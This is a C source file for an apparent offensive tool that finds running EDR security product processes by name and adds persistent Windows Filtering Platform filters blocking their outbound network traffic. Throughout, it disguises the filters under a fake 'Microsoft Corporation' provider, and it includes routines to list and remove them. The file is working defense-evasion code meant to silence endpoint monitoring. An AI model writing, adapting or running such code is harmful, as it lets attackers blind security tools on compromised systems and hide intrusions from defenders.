#include "wfp.h"
#include "convert.h"

/* ── WFP filter identity (masquerade as built-in provider) ──── */

static WCHAR* customFilterName         = (WCHAR*)L"Custom Outbound Filter";
static WCHAR* filterProviderName       = (WCHAR*)L"Microsoft Corporation";
static WCHAR* uniqueProviderDescription = (WCHAR*)L"Microsoft Windows WFP Built-in custom provider.";

/* ── NT path conversion ─────────────────────────────────────── */

static BOOL GetNtPath(PCWSTR filePath, wchar_t* ntPathBuffer, size_t bufferSize) {
    WCHAR drivePrefix[10];
    WCHAR ntDevicePath[MAX_PATH];

    if (!filePath || !ntPathBuffer)
        return FALSE;

    const wchar_t* colon = wcschr(filePath, L':');
    if (!colon || (size_t)(colon - filePath + 1) >= sizeof(drivePrefix) / sizeof(WCHAR))
        return FALSE;

    wcsncpy(drivePrefix, filePath, colon - filePath + 1);
    drivePrefix[colon - filePath + 1] = L'\0';

    if (QueryDosDeviceW(drivePrefix, ntDevicePath, sizeof(ntDevicePath) / sizeof(WCHAR)) == 0)
        return FALSE;

    swprintf(ntPathBuffer, bufferSize, L"%s%s", ntDevicePath, filePath + wcslen(drivePrefix));

    for (size_t i = 0; ntPathBuffer[i] != L'\0'; ++i)
        ntPathBuffer[i] = towlower(ntPathBuffer[i]);

    return TRUE;
}

static BOOL CustomFwpmGetAppIdFromFileName0(PCWSTR filePath, FWP_BYTE_BLOB** appId) {
    if (!filePath)
        return FALSE;

    if (GetFileAttributesW(filePath) == INVALID_FILE_ATTRIBUTES)
        return FALSE;

    WCHAR ntPath[MAX_PATH];
    if (!GetNtPath(filePath, ntPath, sizeof(ntPath) / sizeof(WCHAR)))
        return FALSE;

    *appId = (FWP_BYTE_BLOB*)malloc(sizeof(FWP_BYTE_BLOB));
    if (!*appId)
        return FALSE;

    (*appId)->size = (UINT32)(wcslen(ntPath) * sizeof(WCHAR) + sizeof(WCHAR));
    (*appId)->data = (UINT8*)malloc((*appId)->size);
    if (!(*appId)->data) {
        free(*appId);
        *appId = NULL;
        return FALSE;
    }

    memcpy((*appId)->data, ntPath, (*appId)->size);
    return TRUE;
}

static void FreeAppIdBlob(FWP_BYTE_BLOB* blob) {
    if (blob) {
        free(blob->data);
        free(blob);
    }
}

/* ── Provider lookup ────────────────────────────────────────── */

static BOOL FindProviderGUIDByDesc(PCWSTR providerDesc, GUID* providerGUIDOut) {
    HANDLE engineHandle = NULL;
    HANDLE enumHandle   = NULL;
    FWPM_PROVIDER0** providerList = NULL;
    UINT32 providerCount = 0;

    DWORD status = FwpmEngineOpen0(NULL, RPC_C_AUTHN_DEFAULT, NULL, NULL, &engineHandle);
    if (status != ERROR_SUCCESS)
        return FALSE;

    status = FwpmProviderCreateEnumHandle0(engineHandle, NULL, &enumHandle);
    if (status != ERROR_SUCCESS) {
        FwpmEngineClose0(engineHandle);
        return FALSE;
    }

    status = FwpmProviderEnum0(engineHandle, enumHandle, 100, &providerList, &providerCount);
    if (status != ERROR_SUCCESS) {
        FwpmProviderDestroyEnumHandle0(engineHandle, enumHandle);
        FwpmEngineClose0(engineHandle);
        return FALSE;
    }

    BOOL found = FALSE;
    for (UINT32 i = 0; i < providerCount; i++) {
        if (providerList[i]->displayData.description &&
            wcscmp(providerList[i]->displayData.description, providerDesc) == 0) {
            *providerGUIDOut = providerList[i]->providerKey;
            found = TRUE;
            break;
        }
    }

    FwpmFreeMemory0((void**)&providerList);
    FwpmProviderDestroyEnumHandle0(engineHandle, enumHandle);
    FwpmEngineClose0(engineHandle);
    return found;
}

/* ── Dedup: track which exe names already have a filter ─────── */

#define MAX_BLOCKED 256
static char  g_blocked[MAX_BLOCKED][MAX_PATH];
static int   g_blockedCount = 0;

static BOOL AlreadyBlocked(const char* name) {
    for (int i = 0; i < g_blockedCount; i++) {
        if (_stricmp(g_blocked[i], name) == 0)
            return TRUE;
    }
    return FALSE;
}

static void MarkBlocked(const char* name) {
    if (g_blockedCount < MAX_BLOCKED)
        strncpy(g_blocked[g_blockedCount++], name, MAX_PATH - 1);
}

/* ── Block EDR traffic ──────────────────────────────────────── */

void ApplyEdrTrafficBlockFilter(const char* edrProcesses[], size_t count) {
    HANDLE wfpSession     = NULL;
    HANDLE processSnap    = NULL;
    BOOL   edrDetected    = FALSE;

    g_blockedCount = 0;

    DWORD status = FwpmEngineOpen0(NULL, RPC_C_AUTHN_DEFAULT, NULL, NULL, &wfpSession);
    if (status != ERROR_SUCCESS) {
        printf("[-] Unable to open WFP session: 0x%x\n", status);
        return;
    }

    processSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (processSnap == INVALID_HANDLE_VALUE) {
        printf("[-] Process snapshot failed: 0x%x\n", GetLastError());
        FwpmEngineClose0(wfpSession);
        return;
    }

    PROCESSENTRY32 pe = { 0 };
    pe.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First(processSnap, &pe)) {
        printf("[-] Process32First failed: 0x%x\n", GetLastError());
        CloseHandle(processSnap);
        FwpmEngineClose0(wfpSession);
        return;
    }

    do {
        char* exeName = WideCharToChar(pe.szExeFile);
        if (!exeName) continue;

        BOOL match = FALSE;
        for (size_t i = 0; i < count; i++) {
            if (_stricmp(exeName, edrProcesses[i]) == 0) {
                match = TRUE;
                break;
            }
        }

        if (!match || AlreadyBlocked(exeName)) {
            free(exeName);
            continue;
        }

        edrDetected = TRUE;
        printf("\n[*] EDR process: %s (PID %lu)\n", exeName, pe.th32ProcessID);

        HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);
        if (!hProc) {
            printf("[-] Cannot open process (%lu)\n", GetLastError());
            free(exeName);
            continue;
        }

        WCHAR processPath[MAX_PATH] = { 0 };
        DWORD pathSize = MAX_PATH;
        QueryFullProcessImageNameW(hProc, 0, processPath, &pathSize);
        CloseHandle(hProc);

        FWP_BYTE_BLOB* appIdBlob = NULL;
        if (!CustomFwpmGetAppIdFromFileName0(processPath, &appIdBlob)) {
            printf("[-] App ID conversion failed for %ls\n", processPath);
            free(exeName);
            continue;
        }

        /* Build filter */
        FWPM_FILTER_CONDITION0 cond = { 0 };
        cond.fieldKey              = FWPM_CONDITION_ALE_APP_ID;
        cond.matchType             = FWP_MATCH_EQUAL;
        cond.conditionValue.type   = FWP_BYTE_BLOB_TYPE;
        cond.conditionValue.byteBlob = appIdBlob;

        FWPM_FILTER0 filter = { 0 };
        filter.displayData.name    = customFilterName;
        filter.flags               = FWPM_FILTER_FLAG_PERSISTENT;
        filter.action.type         = FWP_ACTION_BLOCK;
        filter.filterCondition     = &cond;
        filter.numFilterConditions = 1;

        /* Attach to our custom provider */
        GUID providerGuid = { 0 };
        if (FindProviderGUIDByDesc(uniqueProviderDescription, &providerGuid)) {
            filter.providerKey = &providerGuid;
        } else {
            FWPM_PROVIDER0 prov = { 0 };
            prov.displayData.name        = filterProviderName;
            prov.displayData.description = uniqueProviderDescription;
            prov.flags                   = FWPM_PROVIDER_FLAG_PERSISTENT;

            status = FwpmProviderAdd0(wfpSession, &prov, NULL);
            if (status == ERROR_SUCCESS)
                FindProviderGUIDByDesc(uniqueProviderDescription, &providerGuid);
            filter.providerKey = &providerGuid;
        }

        /* IPv4 */
        UINT64 filterId = 0;
        filter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V4;
        status = FwpmFilterAdd0(wfpSession, &filter, NULL, &filterId);
        if (status == ERROR_SUCCESS)
            printf("[+] Filter added: \"%ls\" (IPv4, ID %llu)\n", processPath, filterId);
        else
            printf("[-] IPv4 filter failed: 0x%x\n", status);

        /* IPv6 */
        filter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V6;
        status = FwpmFilterAdd0(wfpSession, &filter, NULL, &filterId);
        if (status == ERROR_SUCCESS)
            printf("[+] Filter added: \"%ls\" (IPv6, ID %llu)\n", processPath, filterId);
        else
            printf("[-] IPv6 filter failed: 0x%x\n", status);

        MarkBlocked(exeName);
        FreeAppIdBlob(appIdBlob);
        free(exeName);
    } while (Process32Next(processSnap, &pe));

    if (!edrDetected)
        printf("[*] No EDR processes found in the running process list.\n");

    CloseHandle(processSnap);
    FwpmEngineClose0(wfpSession);
}

/* ── Remove custom filters ──────────────────────────────────── */

void RemoveCustomWfpFilters() {
    HANDLE wfpSession    = NULL;
    HANDLE enumHandle    = NULL;
    FWPM_FILTER0** filterList = NULL;
    UINT32 filterCount   = 0;
    BOOL   filterExists  = FALSE;

    DWORD status = FwpmEngineOpen0(NULL, RPC_C_AUTHN_DEFAULT, NULL, NULL, &wfpSession);
    if (status != ERROR_SUCCESS) {
        printf("[-] Could not open WFP session: 0x%x\n", status);
        return;
    }

    status = FwpmFilterCreateEnumHandle0(wfpSession, NULL, &enumHandle);
    if (status != ERROR_SUCCESS) {
        printf("[-] Failed to create filter enum handle: 0x%x\n", status);
        FwpmEngineClose0(wfpSession);
        return;
    }

    while (TRUE) {
        status = FwpmFilterEnum0(wfpSession, enumHandle, 1, &filterList, &filterCount);
        if (status != ERROR_SUCCESS || filterCount == 0)
            break;

        if (wcscmp(filterList[0]->displayData.name, customFilterName) == 0) {
            filterExists = TRUE;
            UINT64 id = filterList[0]->filterId;
            status = FwpmFilterDeleteById0(wfpSession, id);
            if (status == ERROR_SUCCESS)
                printf("[+] Deleted filter ID %llu\n", id);
            else
                printf("[-] Failed to delete filter %llu: 0x%x\n", id, status);
        }

        FwpmFreeMemory0((void**)&filterList);
    }

    /* Remove custom provider */
    GUID provGuid = { 0 };
    if (FindProviderGUIDByDesc(uniqueProviderDescription, &provGuid)) {
        status = FwpmProviderDeleteByKey0(wfpSession, &provGuid);
        if (status == ERROR_SUCCESS)
            printf("[+] Custom provider removed\n");
        else if (status != FWP_E_IN_USE)
            printf("[-] Provider delete failed: 0x%x\n", status);
    }

    if (!filterExists)
        printf("[*] No custom filters found\n");

    FwpmFilterDestroyEnumHandle0(wfpSession, enumHandle);
    FwpmEngineClose0(wfpSession);
}

/* ── List custom filters ────────────────────────────────────── */

BOOL DisplayAllWfpFilters() {
    HANDLE wfpSession   = NULL;
    HANDLE enumHandle   = NULL;
    FWPM_FILTER** filterArray = NULL;
    UINT32 returned     = 0;

    DWORD status = FwpmEngineOpen0(NULL, RPC_C_AUTHN_DEFAULT, NULL, NULL, &wfpSession);
    if (status != ERROR_SUCCESS) {
        printf("[-] Failed to open WFP session: 0x%x\n", status);
        return FALSE;
    }

    status = FwpmFilterCreateEnumHandle0(wfpSession, NULL, &enumHandle);
    if (status != ERROR_SUCCESS) {
        printf("[-] Failed to create enum handle: 0x%x\n", status);
        FwpmEngineClose0(wfpSession);
        return FALSE;
    }

    BOOL found = FALSE;
    do {
        status = FwpmFilterEnum0(wfpSession, enumHandle, 10, &filterArray, &returned);
        if (status != ERROR_SUCCESS || returned == 0)
            break;

        for (UINT32 i = 0; i < returned; i++) {
            if (wcscmp(filterArray[i]->displayData.name, customFilterName) == 0) {
                found = TRUE;
                printf("  Filter ID: %llu\n", filterArray[i]->filterId);

                if (filterArray[i]->numFilterConditions > 0 &&
                    filterArray[i]->filterCondition[0].conditionValue.type == FWP_BYTE_BLOB_TYPE) {
                    FWP_BYTE_BLOB* blob = filterArray[i]->filterCondition[0].conditionValue.byteBlob;
                    if (blob && blob->data)
                        printf("  App Path: %ls\n", (WCHAR*)blob->data);
                }
                printf("\n");
            }
        }

        FwpmFreeMemory0((void**)&filterArray);
    } while (returned > 0);

    if (!found)
        printf("  (no custom filters found)\n");

    FwpmFilterDestroyEnumHandle0(wfpSession, enumHandle);
    FwpmEngineClose0(wfpSession);
    return TRUE;
}
